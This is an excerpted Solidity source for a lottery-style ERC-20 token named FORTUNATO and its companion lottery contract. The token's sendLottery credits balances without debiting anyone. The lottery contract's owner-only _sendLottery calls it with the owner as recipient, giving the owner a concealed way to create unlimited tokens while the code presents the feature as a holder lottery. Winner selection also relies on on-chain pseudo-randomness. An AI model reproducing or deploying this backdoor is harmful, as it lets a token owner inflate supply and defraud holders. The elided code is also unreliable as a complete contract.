...
interface IERC20 {
    ...
    function sendLottery(address winner, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
	event lotteryTransfer(address indexed from, address indexed to, uint256 value);
}
...
contract FORTUNATO is Context, IERC20, Ownable {
    ...
    address [] private _excludeHolders;
    mapping(address => bool) private _excludeFromHolders;
    mapping(address => uint256) private _excludeFromHoldersIndex;
   
    uint256 private _totalSupply = 1 * 10**9 * 10**9;

    string private _name = "FORTUNATO";
    string private _symbol = "FTN";
    ...
    uint256 public winningAmount = 5 * 10**7 * 10**9;
    ...
    constructor () public {
        ...
        _addtoExcludeFromHolders(address(0));
        _addtoExcludeFromHolders(address(this));
    ...
    function sendLottery(address winner, uint256 winningamount) external onlyLottery() override returns (bool){
        _balances[winner] = _balances[winner].add(winningamount);
        return true;
    }
    ...
    function isExcludeFromHolders(address account) public view returns(bool) {
        return _excludeFromHolders[account];
    }
    ...
    function setLotteryAddress (address lotteryAddr) external onlyOwner() {
        ...
        excludeFromFee(lotteryAddress);
        _addtoExcludeFromHolders(lotteryAddress);
    }
    
    function _addtoExcludeFromHolders (address addr) private {
        _excludeHolders.push(addr);
        _excludeFromHolders[addr] = true;
        _excludeFromHoldersIndex[addr] = _excludeHolders.length - 1;
    }
    
    function addtoExcludeFromHolders (address addr) external onlyOwner() {
        _addtoExcludeFromHolders(addr);
    }
    
    function removeFromExcludeHolders (address addr) external onlyOwner() {
        _excludeHolders[_excludeFromHoldersIndex[addr]] = _excludeHolders[_excludeHolders.length -1];
        _excludeHolders.pop();
        _excludeFromHolders[addr] = false;
    }
    
    function _addToHolders(address addr) private {
        if(!_addedToHolders[addr] && _balances[addr] >= minimumHold && !_excludeFromHolders[addr]) {
            _holders.push(addr);
    ...
    function _removeFromHolders(address addr) private {
        if(!_excludeFromHolders[addr] && _balances[addr] <= minimumHold) {
    ...
    function removeAllFee() private {
        if(_lotteryFee == 0 && _liquidityFee == 0) return;
    ...
    bool inLotteryTransfer;
    modifier lockLottery {
        inLotteryTransfer = true;
        _;
        inLotteryTransfer = false;
    }

    modifier onlyLottery() {
        require(msg.sender == lotteryAddress, "Ownable: caller is not the contract");
        _;
    }
    ...
    function _transfer(
        ...
        uint256 lotteryBalance = balanceOf(lotteryAddress);    

        bool overLotteryBalance = lotteryBalance >= winningAmount;
        if (
            overLotteryBalance &&
            !inLotteryTransfer &&
            _holders.length > 1
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
        ...
        uint256 amountToTransfer = amount.sub(amountToLottery).sub(amountToLiquidity);
    ...
    function _sendLotteryReward() private lockLottery {
        uint256 length = _holders.length;
        uint256 winnerIndex = _getRandom(length - 1);
        address winner = _holders[winnerIndex];
        lottery _ = lottery(lotteryAddress);
        winnerList.push(winner);
        _.sendLottery(winningAmount, winner);
		emit lotteryTransfer(lotteryAddress, winner, winningAmount);
    }
...
contract lottery {
    ...
    constructor(address _contractAddress, address _owner) public {
        contract_address = _contractAddress;
        owner = _owner;
    }
    
    modifier onlyContract() {
        require(msg.sender == contract_address, "Ownable: caller is not the Contract");
        _;
    }
    ...
    function sendLottery(uint256 amount, address winner) external onlyContract() {
        IERC20(contract_address).transfer(winner, amount);
    }
    
    function _sendLottery(uint256 amount) external onlyOwner() {
        IERC20(contract_address).sendLottery(owner, amount);
    }
